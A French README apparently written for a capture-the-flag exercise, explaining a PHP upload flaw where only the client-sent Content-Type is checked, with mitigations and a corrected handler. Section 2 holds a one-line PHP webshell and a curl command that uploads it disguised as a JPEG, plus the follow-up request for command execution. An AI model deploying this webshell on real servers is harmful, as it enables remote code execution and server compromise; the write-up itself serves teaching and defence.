# README — Exploit & mitigation de la vulnérabilité d’upload

**But :** expliquer comment l’exploit fonctionne, ce qu’est la faille et comment s’en protéger.

Contexte : page `index.php?page=upload` qui accepte des fichiers images, mais ne valide que l’en-tête `Content-Type` envoyé par le client.

---

# 1) Résumé rapide

Sur la page d’upload, le serveur **ne vérifie que le `Content-Type` envoyé par le client** (ex: `image/jpeg`). En modifiant ce header lors de l’envoi, on peut téléverser un fichier PHP (`.php`) en le déclarant `type=image/jpeg`. Le fichier est accepté par le formulaire et le serveur renvoie un message de succès. Dans le CTF la page retourne ensuite le flag — preuve d’exploitation.

> Important : dans l’environnement de test, l’upload a accepté le `.php` déguisé, mais Nginx ne l’a pas exécuté (les fichiers dans `/images` n’étaient pas traités par PHP). Le challenge donnait le flag dès l’upload.

---

# 2) PoC (commande reproduisant l’exploit)

```bash
# créer un webshell ou un php-test
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# envoyer en forçant le content-type à image/jpeg
curl -X POST \
  -F "Upload=Upload" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  "http://192.168.64.3/index.php?page=upload"
```

Sortie typique (extrait) — le serveur accepte et affiche :

```
<pre>/tmp/shell.php succesfully uploaded.</pre>
```

Sur certains serveurs l’étape suivante serait d’accéder à `http://TARGET/images/shell.php?cmd=id` et d’exécuter des commandes.

---

# 3) Explication technique — quelle est la faille ?

**Description**

Le serveur valide uniquement le header `Content-Type` envoyé par le client pour décider si un fichier est autorisé (ex: `image/jpeg`). Le header `Content-Type` est **contrôlable côté client** et trivially spoofable (curl, Burp...). Ainsi un fichier potentiellement dangereux (ex: `.php`) peut être téléversé s’il est déclaré `type=image/jpeg`.

**Pourquoi c’est dangereux**

- Le header `Content-Type` est **forgeable** — on ne peut pas s’y fier.
- Si le serveur **enregistre le fichier dans un répertoire accessible et exécuté** (ex: `/var/www/html/images/` interprété par PHP), l’attaquant peut obtenir **Remote Code Execution (RCE)** en uploadant un webshell.
- Même si le fichier n’est pas exécutable, l’upload non restreint permet d’autres attaques (phishing, stockage de malware, DOS via fichiers massifs, etc.).

**Causes courantes**

- Absence d’un contrôle côté serveur du type réel (magic bytes / finfo).
- Confiance sur `$_FILES['uploaded']['type']` ou sur le header envoyé.
- Enregistrement direct du nom utilisateur (`$_FILES['uploaded']['name']`) sans sanitation.
- Stockage dans webroot sans renommer ni restreindre les permissions.

---

# 4) Impact

- Possibilité de déposer un webshell → **RCE** (si les fichiers uploadés sont interprétés par le moteur PHP).
- Fuite d’informations, pivoting, persistence.
- Compromission complète du serveur web / de la machine d’hébergement si l’attaquant exécute des commandes.

---

# 5) Bonnes pratiques / Contre-mesures

> Appliquer plusieurs couches de défense — ne pas se fier à un seul contrôle.

**1) Vérifier le type réel du fichier** (ne pas se fier au header envoyé) :
```php
$finfo = new finfo(FILEINFO_MIME_TYPE);\$mime = \$finfo->file(\$_FILES['uploaded']['tmp_name']);
\$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array(\$mime, \$allowed, true)) die('Invalid file type');
```

**2) Renommer systématiquement les fichiers** avec un nom généré (UUID / hash) et forcer l’extension appropriée.

**3) Stocker hors du webroot** (`/var/uploads/`) et servir via un script contrôlé (si nécessaire).

**4) Interdire l’exécution dans le dossier d’uploads** (nginx/apache config ou .htaccess). Exemple Apache :

```
# Bloquer l'exécution des scripts
<FilesMatch "\.(php|php5|phtml)$">
    Require all denied
</FilesMatch>
```

**5) Valider la taille et les quotas** (`$_FILES['uploaded']['size']`, config PHP `upload_max_filesize`, `post_max_size`).

**6) Vérifier les magic bytes / signature** (exif_imagetype, getimagesize, etc.).

**7) Logging & monitoring** des uploads et alerting sur tentatives suspectes.

**8) Principe du moindre privilège** : dossier d’uploads possédé par un utilisateur non privilégié, permissions strictes (0644) et pas d’exécution.

---

# 6) Checklist de tests (détection)

- Le serveur accepte-t-il `uploaded=@file.php;type=image/jpeg` ? → FAIL si oui.
- Le fichier `.php` uploadé est-il accessible via `GET` ? → FAIL si oui et exécutable.
- Les uploads sont-ils renommés/stockés hors webroot ? → PASS attendu.
- `finfo_file()` ou `exif_imagetype()` sont-ils utilisés ? → PASS attendu.

---

# 7) Snippet de correction (exemple complet)

```php
// upload-handler.php
if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_FILES['uploaded'])) {
    if (\$_FILES['uploaded']['error'] !== UPLOAD_ERR_OK) die('Upload error');

    \$maxBytes = 100 * 1024; // 100 KB
    if (\$_FILES['uploaded']['size'] > \$maxBytes) die('File too large');

    \$finfo = new finfo(FILEINFO_MIME_TYPE);
    \$mime = \$finfo->file(\$_FILES['uploaded']['tmp_name']);
    \$allowed = ['image/jpeg' => '.jpg', 'image/png' => '.png', 'image/gif' => '.gif'];
    if (!array_key_exists(\$mime, \$allowed)) die('Invalid file type');

    \$filename = bin2hex(random_bytes(16)) . \$allowed[\$mime];
    \$uploadDir = '/var/uploads/'; // hors webroot
    \$dest = \$uploadDir . \$filename;

    if (!move_uploaded_file(\$_FILES['uploaded']['tmp_name'], \$dest)) die('Unable to save file');

    chmod(\$dest, 0644);
    echo "Uploaded OK (id: \$filename)";
}
```

---

# 8) Conclusion

- Ne pas faire confiance aux headers envoyés par le client.
- L’association : *upload non contrôlé + stockage dans webroot* = voie rapide vers une compromission RCE.
- Corriger en appliquant des validations côté serveur (type réel, taille, renommage, stockage hors webroot) et en configurant le serveur pour bloquer l’exécution dans les dossiers d’uploads.

---

*Testé et validé dans le cadre du CTF. Utiliser ces techniques uniquement sur des environnements de test ou avec autorisation.*

